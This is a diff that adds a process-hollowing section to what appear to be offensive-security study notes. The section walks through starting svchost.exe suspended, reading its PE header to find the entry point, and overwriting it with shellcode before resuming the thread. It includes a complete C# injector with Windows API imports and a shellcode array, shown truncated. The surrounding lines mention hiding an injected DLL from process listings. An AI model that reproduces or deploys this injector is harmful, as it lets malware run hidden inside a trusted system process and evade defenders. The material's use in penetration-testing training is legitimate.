@@ -1774,7 +1774,14 @@ Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 Notice the shell.dll is not shown in the loaded DLL listing of Process Explorer.
 
 ## Process Hollowing
-We will launch a svchost.exe process and modify it before it actually starts executing. This is known as Process Hollowing and should execute our payload without terminating it.
+
+<details>
+  <summary>Expand</summary>
+
+We will launch a suspended svchost.exe process and modify it before it actually starts executing. This is known as Process Hollowing and should execute our payload without terminating it.
+
+We will use ReadProcessMemory to read the first 0x200 bytes of memory. This will allow us to analyze the remote process PE header.
+The relevant items are shown in the PE file format header shown below
 
 |Offset|0x00|0x04|0x08|0x0C|
 |------|----|----|----|----|
@@ -1791,6 +1798,149 @@ We will launch a svchost.exe process and modify it before it actually starts exe
 |0xA0|||AddressOfEntryPoint||
 |0xB0|||||
 |0xC0|||||
+
+All PE files must follow this format, which enables us to predict where to read from. First, we read the e_lfanew field at offset 0x3C, which contains the offset from the beginning of the PE (image base) to the PE Header. This offset is given as 0x80 bytes in Table 1 but can vary from file to file. The PE signature found in the PE file format header (above) identifies the beginning of the PE header.
+
+Once we have obtained the offset to the PE header, we can read the EntryPoint Relative Virtual Address (RVA) located at offset 0x28 from the PE header. As the name suggests, the RVA is just an offset and needs to be added to the remote process base address to obtain the absolute virtual memory address of the EntryPoint. Finally, we have the desired start address for our shellcode.
+
+As a fictitious example, imagine we locate the PEB at address 0x3004000. We then use ReadProcessMemory to read the executable base address at 0x3004010 and obtain the value 0x7ffff01000000.
+
+We use ReadProcessMemory to read out the first 0x200 bytes of the executable and then locally inspect the value at address 0x7ffff0100003C to find the offset to the PE header. In our example, that value will be 0x110 bytes, meaning the PE header is at 0x7ffff01000110.
+
+Now we can locate the RVA of the entry point from address 0x7ffff01000138 and add that to the base address of 0x7ffff01000000. The result of that calculation is the virtual address of the entry point inside the remote process.
+
+Once we have located the EntryPoint of the remote process, we can use WriteProcessMemory to overwrite the original content with our shellcode. We can then let the execution of the thread inside the remote process continue.
+
+### Process Hollowing in C#
+Open Visual Studio and create a .NET standard Console App.
+Example: Look for DLLImport for CreateProcessW from www.pinvoke.net. 
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Runtime.InteropServices;
+
+namespace Hollow
+{
+    class Program
+    {
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread); 
+
+        static void Main(string[] args)
+        {
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            
+            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
+                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+        uint tmp = 0;
+        IntPtr hProcess = pi.hProcess;
+        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+        
+        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+        byte[] addrBuf = new byte[IntPtr.Size];
+        IntPtr nRead = IntPtr.Zero;
+        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+        
+        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+        byte[] data = new byte[0x200];
+        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+        
+        uint opthdr = e_lfanew_offset + 0x28;
+        
+        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+        
+        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+        byte[] buf = new byte[659] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...}
+        
+        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+        ResumeThread(pi.hThread);
+        }
+    }
+
+}
+```
+Set architecture to x64, switch from debug to release mode and build the solution.
+
+Visualization for e_lfanew offset:
+```
+PE Start / MZ header  ---->  e_lfanew at offsec 0x3C ----> PE start + e_lfanew + 0x28
+                                           |                            |
+                                           |                            |
+                                           V                            V
+                                        PE Header                 Code Entrypoint
+```
+
+
+</details>
 
 
 # Port Redirection and Tunneling
